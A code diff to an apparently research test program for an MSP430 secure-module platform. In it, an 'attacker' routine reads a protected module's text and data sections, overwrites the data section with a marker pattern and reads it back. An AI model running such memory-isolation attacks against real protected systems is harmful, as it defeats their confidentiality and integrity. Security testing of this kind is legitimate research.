@@ -25,15 +25,10 @@ int main()
     uint16_t  stolen_data = -2; // initialize with unequivocal content
     uint16_t  mp;
     
-    // Allocate dinamic memory for saving read content    
-    text_section_dim = N_DATA;
-    //data_section_dim = N_DATA;
-    data_saved = (uint16_t *) malloc(text_section_dim*sizeof(uint16_t));
     // Initialize with a message
 	for (i=0; i<N_DATA; i++)
 		data_to_send[i] = (i%2 == 0) ? 0xF00D : 0xF1D0;
-		
-		
+			
 	//---------------------------------------------------
     msp430_io_init();
 
@@ -71,9 +66,15 @@ int main()
     get_struct_val(&reader, &ts, &te, &ds, &de, &id, &vendor_id, name);
     printf("SM ID: %d \n TS: 0x%.4x - TE: 0x%.4x \n DS: 0x%.4x - DE 0x%.4x \n", id, ts, te, ds, de);
    	
-   	// Read Text section 
-    if (data_saved == NULL)
+   	// Allocate dinamic memory for saving read content    
+    text_section_dim = N_DATA;
+    data_saved = (uint16_t *) malloc(text_section_dim*sizeof(uint16_t));
+    	
+	// Read Text section 
+    if (data_saved == NULL) {
     	printf("[main.c] impossible to allocate enough memory for text section!\n");
+		EXIT();
+	}
 	else {
 		printf("[main.c] start reading into SM%d's text section...\n",id);
     	attacker_read(ts, N_DATA, data_saved);
@@ -100,6 +101,49 @@ int main()
   		printf("[attacker] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, print_add, *(data_saved+i) );  
     	print_add = print_add + 2;  
     }		
+    
+    printf("-----------------------------------------------------------\n");
+    printf("-----------------------------------------------------------\n");
+    printf("-----------------------------------------------------------\n");
+        
+    
+    // Allocate dinamic memory for saving read content    
+    data_section_dim = N_DATA;
+    data_saved = (uint16_t *) malloc(data_section_dim*sizeof(uint16_t));
+    	
+	// Read Data section 
+    if (data_saved == NULL) {
+    	printf("[main.c] impossible to allocate enough memory for data section!\n");
+		EXIT();
+	}
+	else {
+		printf("[main.c] start reading into SM%d's data section...\n",id);
+    	attacker_read(ds, N_DATA, data_saved);
+  		}
+
+	print_add = ds;  		  	  		
+   	for (i = 0; i<N_DATA; i++)
+   	{
+		printf("[attacker] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, print_add, *(data_saved+i) );
+		print_add = print_add +2;
+	}	
+	// Write into Data Section	
+	printf("[main.c] start writing into SM%d's data section...\n",id);
+	for (i = 0; i<N_DATA; i++)
+		printf("data to write nr.%d: 0x%.4x \n",i,data_to_send[i]);
+	attacker_write(ds, N_DATA, data_to_send);
+	
+	printf("[main.c] start reading into SM%d's data section after having written...\n",id);
+    attacker_read(ds, N_DATA, data_saved);
+    
+    print_add = ds; 
+    for (i = 0; i<N_DATA; i++)
+  	{
+  		printf("[attacker] Data nr.%d at addr. 0x%.4x \t 0x%.4x \n",i, print_add, *(data_saved+i) );  
+    	print_add = print_add + 2;  
+    }	
+  
+    
     EXIT();
 }
 
